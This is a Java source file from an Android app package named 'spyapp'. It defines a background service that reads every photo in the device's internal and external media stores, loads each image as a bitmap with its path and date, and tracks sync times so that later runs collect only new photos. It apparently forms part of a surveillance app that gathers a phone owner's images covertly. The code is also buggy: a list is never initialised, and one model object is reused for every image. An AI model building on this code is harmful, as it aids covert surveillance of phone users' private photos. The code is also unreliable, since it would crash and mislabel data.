package com.app.spyapp.service;

import android.app.Activity;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.provider.MediaStore;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Pref;
import com.app.spyapp.common.WriteLog;
import com.app.spyapp.model.ImageModel;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;


public class ImageListService extends IntentService {
    private SpyApp spyApp;
    private ArrayList<ImageModel> imageList;
    private long lastExternalSyncDate;
    private long lastInternalSyncDate;


    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     */
    public ImageListService() {

        super(ImageListService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        lastExternalSyncDate = spyApp.getSharedPreferences().getLong(Pref.LAST_EXTERNAL_IMAGE_SYNC, 0);
        lastInternalSyncDate = spyApp.getSharedPreferences().getLong(Pref.LAST_INTERNAL_IMAGE_SYNC, 0);
        ArrayList<ImageModel> internalImageList = getAllImages(this, true);
        if (internalImageList != null && internalImageList.size() > 0) {
            imageList.addAll(internalImageList);
        }
        ArrayList<ImageModel> externalImageList = getAllImages(this, false);
        if (externalImageList != null && externalImageList.size() > 0) {
            imageList.addAll(externalImageList);
        }
    }

    private ArrayList<ImageModel> getAllImages(Context context, boolean fromInternalStorage) {
        // which image properties are we querying
        ArrayList<ImageModel> imageList = new ArrayList<>();

        String[] projection = new String[]{
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME,
                MediaStore.Images.Media.DATE_TAKEN, MediaStore.Images.Media.DATA, MediaStore.Images.Media.IS_PRIVATE, MediaStore.Images.Media.MIME_TYPE, MediaStore.Images.Media.SIZE
        };

        // content:// style URI for the "primary" external storage volume
        Uri images = null;
        if (fromInternalStorage) {
            images = MediaStore.Images.Media.INTERNAL_CONTENT_URI;
        } else {
            images = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        }

        // Make the query.
        Activity activity;
        Cursor cur = context.getContentResolver().query(images,
                projection, // Which columns to return
                null,       // Which rows to return (all rows)
                null,       // Selection arguments (none)
                null        // Ordering
        );

        Log.i("Debug", " query count=" + cur.getCount());

        if (cur.moveToFirst()) {

            ImageModel imageModel = new ImageModel();
            int id;
            String bucket;
            String date;
            String path;
            String mimetpe;
            int isPrivate;
            String size;

            int idcolumn = cur.getColumnIndex(
                    MediaStore.Images.Media._ID);

            int bucketColumn = cur.getColumnIndex(
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME);

            int dateColumn = cur.getColumnIndex(
                    MediaStore.Images.Media.DATE_TAKEN);

            int pathColumn = cur.getColumnIndex(
                    MediaStore.Images.Media.DATA);

            int mimetypeColumn = cur.getColumnIndex(
                    MediaStore.Images.Media.MIME_TYPE);

            int sizeColumn = cur.getColumnIndex(
                    MediaStore.Images.Media.SIZE);


            do {
                // Get the field values
                id = cur.getInt(idcolumn);
                bucket = cur.getString(bucketColumn);
                date = cur.getString(dateColumn);
                path = cur.getString(pathColumn);
                mimetpe = cur.getString(mimetypeColumn);
                //sizeColumn = cur.getInt(sizeColumn);
                long tempdate = 0;

                if (fromInternalStorage) {
                    tempdate = lastInternalSyncDate;
                } else {
                    tempdate = lastExternalSyncDate;
                }
                if (Long.parseLong(date) > tempdate) {
                    Bitmap bitmap = null;
                    try {
                        bitmap = MediaStore.Images.Media.getBitmap(context.getContentResolver(), Uri.parse("file://" + path));
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                    imageModel.setId(id);
                    imageModel.setDisplayName(bucket);
                    imageModel.setImagedatemilies(Long.parseLong(date));
                    imageModel.setImagePath(path);
                    imageModel.setMimetype(mimetpe);
                    imageModel.setBitmap(bitmap);
                    imageModel.setLastupdateDate(System.currentTimeMillis());
                    imageList.add(imageModel);

                }
                // Do something with the values.
                Log.i("Debug", " bucket=" + bucket
                        + "  date_taken=" + date);
            } while (cur.moveToNext());
        }
        SharedPreferences.Editor editor = spyApp.getSharedPreferences().edit();
        if (fromInternalStorage) {
            editor.putLong(Pref.LAST_INTERNAL_IMAGE_SYNC, Calendar.getInstance().getTimeInMillis());
        } else {
            editor.putLong(Pref.LAST_EXTERNAL_IMAGE_SYNC, Calendar.getInstance().getTimeInMillis());
        }

        editor.commit();
        return imageList;
    }
}
